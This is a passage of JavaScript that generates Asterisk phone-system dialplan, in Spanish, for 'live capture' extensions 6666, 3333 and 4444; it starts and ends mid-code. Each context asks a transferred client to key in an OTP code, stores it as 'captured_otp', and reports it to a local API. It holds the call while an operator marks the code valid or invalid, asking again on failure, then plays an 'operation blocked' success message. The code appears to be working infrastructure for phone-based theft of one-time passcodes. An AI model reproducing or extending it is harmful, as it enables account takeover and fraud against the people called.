  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/6666)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/7777)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/8888)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/last)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/global)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_last_status)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_decision)}))\n`;
  dialplanContent += ` same => n,Set(CURRENT_STATUS=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz,\${RAW_STATUS})})})\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-6666] Ciclo \${WAIT_LOOP}/60 - Estado: \${CURRENT_STATUS} ===)\n`;
  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?codigo_aprobado)\n`;
  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?codigo_rechazado)\n`;
  dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 60]?codigo_aprobado)\n`;
  dialplanContent += ` same => n,ExecIf($[$[\${WAIT_LOOP} % 5] = 0]?Playback(beep))\n`;
  dialplanContent += ` same => n,Wait(1)\n`;
  dialplanContent += ` same => n,Goto(bucle_espera_decision)\n\n`;
  dialplanContent += ` same => n(codigo_aprobado),NoOp(=== [CAPTURA-6666] TOKEN APROBADO: CONECTANDO CON ASESOR \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/6666)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/7777)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/8888)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/last)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/global)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_status)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_decision)=done)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_SUCCESS})\n`;
  dialplanContent += ` same => n,Wait(0.5)\n`;
  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;
  dialplanContent += ` same => n(codigo_rechazado),NoOp(=== [CAPTURA-6666] TOKEN INVALIDO -> REINTENTANDO ===)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/6666)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/last)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/global)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
  dialplanContent += ` same => n,Goto(pedir_codigo)\n\n`;

  dialplanContent += `exten => h,1,NoOp(=== [CAPTURA-6666 HANGUP] Cliente colgo canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
  dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=ended&cause=\${HANGUPCAUSE}&channel=\${CHANNEL}" &)\n\n`;

  // --- CONTEXTO CAPTURA EN VIVO EXTENSIÓN 3333 ---
  dialplanContent += `; ========================================================\n`;
  dialplanContent += `; CONTEXTO CAPTURA EN VIVO EXTENSION 3333\n`;
  dialplanContent += `; Mismas funciones que la 7777 pero con soporte de audios propios (3333_intro, etc.)\n`;
  dialplanContent += `; ========================================================\n`;
  dialplanContent += `[ivr-otp-live-3333]\n`;
  dialplanContent += `exten => s,1,Goto(ivr-captura-vivo-3333,s,1)\n\n`;
  dialplanContent += `[ivr-captura-vivo-3333]\n`;
  dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-3333] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO OTP ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${LAST_AGENT}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${CALLING_AGENT}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/3333)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/7777)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/8888)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-3333] Cliente: \${TARGET_DEST} | Retornara al Agente: \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Set(AUDIO_3333=\${DB(ivr_vars/3333_prompt)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_3333}" = ""]?Set(AUDIO_3333=\${DB(ivr_vars/3333_intro)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_3333}" = ""]?Set(AUDIO_3333=\${DB(ivr_vars/welcome_3333)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_3333}" = ""]?Set(AUDIO_3333=\${DB(ivr_vars/7777_prompt)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_3333}" = ""]?Set(AUDIO_3333=\${DB(ivr_vars/7777_intro)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_3333}" = ""]?Set(AUDIO_3333=\${DB(ivr_vars/\${TARGET_DEST}_prompt)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_3333}" = ""]?Set(AUDIO_3333=custom/solicitar_codigo_otp))\n`;
  dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/3333_wait)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/7777_wait)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=custom/un_momento_validando_informacion))\n`;
  dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/3333_success)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/7777_success)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=custom/operacion_bloqueada_exito))\n`;
  dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/\${TARGET_DEST}_failure)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/3333_failure)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/7777_failure)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=custom/token_invalido_reintente))\n`;
  dialplanContent += ` same => n,Set(RETRY_COUNT=0)\n`;
  dialplanContent += ` same => n(pedir_codigo),Set(RETRY_COUNT=$[\${RETRY_COUNT} + 1])\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-3333] Solicitando Codigo OTP (Intento \${RETRY_COUNT}) con audio: \${AUDIO_3333} ===)\n`;
  dialplanContent += ` same => n,Set(USER_DIGITS=)\n`;
  dialplanContent += ` same => n,Read(USER_DIGITS,\${AUDIO_3333},10,,2,15)\n`;
  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?evaluar_codigo)\n`;
  dialplanContent += ` same => n,Playback(beep)\n`;
  dialplanContent += ` same => n,GotoIf($[\${RETRY_COUNT} < 3]?pedir_codigo)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},30,Tt)\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;
  dialplanContent += ` same => n(evaluar_codigo),NoOp(=== [CAPTURA-3333] DIGITOS RECIBIDOS DEL CLIENTE: \${USER_DIGITS} ===)\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/\${TARGET_DEST})=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/\${CALLERID(num)})=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/3333)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/7777)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/8888)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/last)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/global)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/3333)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/last)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/global)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&otp=\${USER_DIGITS}&agent=\${FINAL_AGENT}&exten=3333&channel=\${CHANNEL}" &)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_WAIT})\n`;
  dialplanContent += ` same => n,Set(WAIT_LOOP=0)\n`;
  dialplanContent += ` same => n(bucle_espera_decision),Set(WAIT_LOOP=$[\${WAIT_LOOP} + 1])\n`;
  dialplanContent += ` same => n,Set(RAW_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${USER_DIGITS})}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/3333)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/7777)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/8888)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/last)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/global)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_last_status)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_decision)}))\n`;
  dialplanContent += ` same => n,Set(CURRENT_STATUS=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz,\${RAW_STATUS})})})\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-3333] Ciclo \${WAIT_LOOP}/60 - Estado: \${CURRENT_STATUS} (Dest: \${TARGET_DEST}, CID: \${CALLERID(num)}, Code: \${USER_DIGITS}) ===)\n`;
  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?codigo_aprobado)\n`;
  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?codigo_rechazado)\n`;
  dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 60]?codigo_aprobado)\n`;
  dialplanContent += ` same => n,ExecIf($[$[\${WAIT_LOOP} % 5] = 0]?Playback(beep))\n`;
  dialplanContent += ` same => n,Wait(1)\n`;
  dialplanContent += ` same => n,Goto(bucle_espera_decision)\n\n`;
  dialplanContent += ` same => n(codigo_aprobado),NoOp(=== [CAPTURA-3333] TOKEN APROBADO: CONECTANDO DE VUELTA CON EL ASESOR \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/3333)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/7777)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/8888)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/last)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/global)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_status)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_decision)=done)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_SUCCESS})\n`;
  dialplanContent += ` same => n,Wait(0.5)\n`;
  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;
  dialplanContent += ` same => n(codigo_rechazado),NoOp(=== [CAPTURA-3333] TOKEN INVALIDO -> REINTENTANDO ===)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/3333)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/last)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/global)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
  dialplanContent += ` same => n,Goto(pedir_codigo)\n\n`;
  dialplanContent += `exten => h,1,NoOp(=== [CAPTURA-3333 HANGUP] Cliente colgo canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
  dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=ended&cause=\${HANGUPCAUSE}&channel=\${CHANNEL}" &)\n\n`;

  // --- CONTEXTO CAPTURA EN VIVO EXTENSIÓN 4444 ---
  dialplanContent += `; ========================================================\n`;
  dialplanContent += `; CONTEXTO CAPTURA EN VIVO EXTENSION 4444\n`;
  dialplanContent += `; Mismas funciones que la 7777 pero con soporte de audios propios (4444_intro, etc.)\n`;
  dialplanContent += `; ========================================================\n`;
  dialplanContent += `[ivr-otp-live-4444]\n`;
  dialplanContent += `exten => s,1,Goto(ivr-captura-vivo-4444,s,1)\n\n`;
  dialplanContent += `[ivr-captura-vivo-4444]\n`;
  dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-4444] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO OTP ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${LAST_AGENT}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${CALLING_AGENT}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/4444)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/7777)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/8888)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-4444] Cliente: \${TARGET_DEST} | Retornara al Agente: \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Set(AUDIO_4444=\${DB(ivr_vars/4444_prompt)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_4444}" = ""]?Set(AUDIO_4444=\${DB(ivr_vars/4444_intro)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_4444}" = ""]?Set(AUDIO_4444=\${DB(ivr_vars/welcome_4444)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_4444}" = ""]?Set(AUDIO_4444=\${DB(ivr_vars/7777_prompt)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_4444}" = ""]?Set(AUDIO_4444=\${DB(ivr_vars/7777_intro)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_4444}" = ""]?Set(AUDIO_4444=\${DB(ivr_vars/\${TARGET_DEST}_prompt)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_4444}" = ""]?Set(AUDIO_4444=custom/solicitar_codigo_otp))\n`;
  dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/4444_wait)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/7777_wait)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=custom/un_momento_validando_informacion))\n`;
  dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/4444_success)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/7777_success)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=custom/operacion_bloqueada_exito))\n`;
  dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/\${TARGET_DEST}_failure)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/4444_failure)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/7777_failure)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=custom/token_invalido_reintente))\n`;
  dialplanContent += ` same => n,Set(RETRY_COUNT=0)\n`;
  dialplanContent += ` same => n(pedir_codigo),Set(RETRY_COUNT=$[\${RETRY_COUNT} + 1])\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-4444] Solicitando Codigo OTP (Intento \${RETRY_COUNT}) con audio: \${AUDIO_4444} ===)\n`;
  dialplanContent += ` same => n,Set(USER_DIGITS=)\n`;
  dialplanContent += ` same => n,Read(USER_DIGITS,\${AUDIO_4444},10,,2,15)\n`;
  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?evaluar_codigo)\n`;
  dialplanContent += ` same => n,Playback(beep)\n`;
  dialplanContent += ` same => n,GotoIf($[\${RETRY_COUNT} < 3]?pedir_codigo)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},30,Tt)\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;
  dialplanContent += ` same => n(evaluar_codigo),NoOp(=== [CAPTURA-4444] DIGITOS RECIBIDOS DEL CLIENTE: \${USER_DIGITS} ===)\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/\${TARGET_DEST})=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/\${CALLERID(num)})=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/4444)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/7777)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/8888)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/last)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(captured_otp/global)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/4444)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/last)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/global)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&otp=\${USER_DIGITS}&agent=\${FINAL_AGENT}&exten=4444&channel=\${CHANNEL}" &)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_WAIT})\n`;
  dialplanContent += ` same => n,Set(WAIT_LOOP=0)\n`;
  dialplanContent += ` same => n(bucle_espera_decision),Set(WAIT_LOOP=$[\${WAIT_LOOP} + 1])\n`;
  dialplanContent += ` same => n,Set(RAW_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${USER_DIGITS})}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/4444)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/7777)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/8888)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/last)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/global)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_last_status)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_decision)}))\n`;
  dialplanContent += ` same => n,Set(CURRENT_STATUS=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz,\${RAW_STATUS})})})\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-4444] Ciclo \${WAIT_LOOP}/60 - Estado: \${CURRENT_STATUS} (Dest: \${TARGET_DEST}, CID: \${CALLERID(num)}, Code: \${USER_DIGITS}) ===)\n`;
